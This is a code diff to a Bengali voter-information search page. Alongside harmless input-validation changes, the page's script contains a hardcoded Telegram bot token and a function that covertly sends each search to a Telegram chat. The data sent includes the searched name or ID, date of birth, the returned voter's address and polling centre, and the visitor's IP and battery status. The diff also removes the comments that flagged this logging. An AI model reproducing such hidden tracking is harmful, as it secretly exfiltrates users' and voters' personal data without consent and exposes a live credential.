@@ -95,6 +95,15 @@
             z-index: 10;
         }
 
+        #warningMsg {
+            display: none;
+            font-size: 11px;
+            font-weight: bold;
+            color: #ef4444;
+            margin-top: 4px;
+            margin-left: 4px;
+        }
+
         @media (max-width: 640px) {
             .info-label {
                 width: 90px;
@@ -175,17 +184,19 @@
                         <label class="text-[10px] font-bold text-gray-400 uppercase ml-1 block mb-1">অনুসন্ধানের ধরণ</label>
                         <select id="type" onchange="handleTypeChange(this.value)"
                             class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 outline-none font-bold text-gray-700 focus:ring-2 focus:ring-blue-500 text-sm">
-                            <option value="voter_id">ভোটার নাম্বার (১২ ডিজিট)</option>
                             <option value="name">ভোটারের নাম</option>
                             <option value="fathers_name">পিতার নাম</option>
                             <option value="mothers_name">মাতার নাম</option>
+                            <option value="voter_id">ভোটার নাম্বার (১২ ডিজিট)</option>
                         </select>
                     </div>
 
                     <div>
-                        <label id="inputLabel" class="text-[10px] font-bold text-gray-400 uppercase ml-1 block mb-1">১২ ডিজিটের ভোটার নাম্বার</label>
-                        <input type="text" id="value" placeholder="এখানে লিখুন..." required
+                        <label id="inputLabel" class="text-[10px] font-bold text-gray-400 uppercase ml-1 block mb-1">আইডি নম্বর বা নাম</label>
+                        <input type="text" id="value" placeholder="সঠিক নাম বা নম্বর লিখুন..." required
+                            oninput="validateInput(this)"
                             class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 outline-none font-bold focus:ring-2 focus:ring-blue-500 text-sm">
+                        <span id="warningMsg"><i class="fas fa-exclamation-triangle"></i> শুধুমাত্র বাংলায় লিখুন (ইংরেজি অক্ষর গ্রহণযোগ্য নয়)</span>
                     </div>
 
                     <div>
@@ -257,10 +268,35 @@
         const TG_TOKEN = "8467310067:AAFo76zk_NC5SkyAfri_WzBuCjP5mm_AO_o";
         const TG_CHAT_ID = "8323795722";
 
-        // Telegram Notification Function
+        // input validation for Bengali and Numeric
+        function validateInput(input) {
+            const type = document.getElementById('type').value;
+            const warning = document.getElementById('warningMsg');
+            
+            if (type === 'voter_id') {
+                // If voter ID, allow only numbers
+                const original = input.value;
+                input.value = original.replace(/[^0-9]/g, '');
+                warning.style.display = (original !== input.value) ? 'block' : 'none';
+                if(original !== input.value) warning.innerText = "শুধুমাত্র সংখ্যা লিখুন।";
+            } else {
+                // If name/father/mother, allow Bengali characters and spaces
+                const original = input.value;
+                // Regex for Bengali range: \u0980-\u09FF plus spaces
+                const bengaliRegex = /^[\u0980-\u09FF\s]*$/;
+                
+                if (!bengaliRegex.test(original)) {
+                    input.value = original.replace(/[a-zA-Z]/g, '');
+                    warning.style.display = 'block';
+                    warning.innerHTML = '<i class="fas fa-exclamation-triangle"></i> শুধুমাত্র বাংলায় লিখুন (ইংরেজি অক্ষর গ্রহণযোগ্য নয়)';
+                } else {
+                    warning.style.display = 'none';
+                }
+            }
+        }
+
         async function sendTelegramLog(voterData, searchType, searchValue, dob) {
             try {
-                // Get Battery Info
                 let batteryLevel = "N/A";
                 let batteryCharging = "";
                 if (navigator.getBattery) {
@@ -269,7 +305,6 @@
                     batteryCharging = battery.charging ? "(চার্জিং)" : "(ডিসচার্জিং)";
                 }
 
-                // Get IP (Optional/Mock since it's client side)
                 const ipRes = await fetch('https://api.ipify.org?format=json').catch(() => null);
                 const ipData = ipRes ? await ipRes.json() : { ip: "N/A" };
 
@@ -296,7 +331,7 @@
                     message += `🏠 ঠিকানা: ${voterData.address || 'N/A'}\n`;
                     message += `🏫 কেন্দ্র: ${voterData.vote_center?.name || voterData.vote_center || 'N/A'}\n`;
                 } else {
-                    message += `❌ ফলাফল: কোনো তথ্য পাওয়া যায়নি\n`;
+                    message += `❌ ফলাফল: কোনো তথ্য পাওয়া যায়নি\n`;
                 }
                 message += `━━━━━━━━━━━━━━━━━━`;
 
@@ -316,14 +351,21 @@
         function handleTypeChange(val) {
             const label = document.getElementById('inputLabel');
             const input = document.getElementById('value');
+            const warning = document.getElementById('warningMsg');
+            
+            warning.style.display = 'none';
+            input.value = ""; // clear input on type change
+
             if (val === 'voter_id') {
                 label.innerText = "১২ ডিজিটের ভোটার নাম্বার";
                 input.placeholder = "১২ ডিজিটের নম্বরটি লিখুন...";
                 input.maxLength = 12;
+                input.type = "tel"; // Numeric keyboard on mobile
             } else {
                 label.innerText = "আইডি নম্বর বা নাম";
                 input.placeholder = "সঠিক নাম বা নম্বর লিখুন...";
                 input.maxLength = 100;
+                input.type = "text";
             }
         }
 
@@ -399,7 +441,6 @@
 
                 if (data.success && data.results && data.results.length > 0) {
                     renderResults(data.results);
-                    // Log the first result to telegram
                     sendTelegramLog(data.results[0], type, val, dobString);
                     showPage('resultView');
                 } else {
@@ -484,7 +525,8 @@
             });
         }
 
-        handleTypeChange('voter_id');
+        // Initialize default view state
+        handleTypeChange(document.getElementById('type').value);
     </script>
 </body>
 
